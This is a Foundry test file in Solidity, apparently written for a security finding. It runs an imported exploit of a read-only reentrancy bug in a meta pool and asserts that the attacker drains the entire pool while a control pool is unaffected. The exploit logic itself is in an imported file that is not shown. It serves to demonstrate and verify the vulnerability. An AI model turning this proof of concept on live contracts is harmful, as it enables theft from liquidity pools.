// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit} from "./27689-read-only-reentrancy-in-meta-pool-with-an-old-base-pool-mixb.sol";

contract FindingTest is Test {
    function test_virtual_price() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.reserve(), e.POOL(), "reserve");
        assertEq(e.priceUsed(), 10 ether, "price");
        assertEq(e.stolen(), e.POOL(), "stolen");
        assertEq(e.poolLeft(), 0, "pool");
        assertEq(e.coin().balanceOf(address(e)), e.POOL(), "attacker");
        assertEq(e.controlOut(), 0, "control out");
        assertEq(e.controlLeft(), e.POOL(), "control left");
        assertEq(e.coinC().balanceOf(address(e)), 0, "control attacker");
        console2.log("reserve");
        console2.log(e.reserve());
        console2.log("price");
        console2.log(e.priceUsed());
        console2.log("stolen");
        console2.log(e.stolen());
        console2.log("pool left");
        console2.log(e.poolLeft());
        console2.log("control out");
        console2.log(e.controlOut());
        console2.log("control left");
        console2.log(e.controlLeft());
    }
}
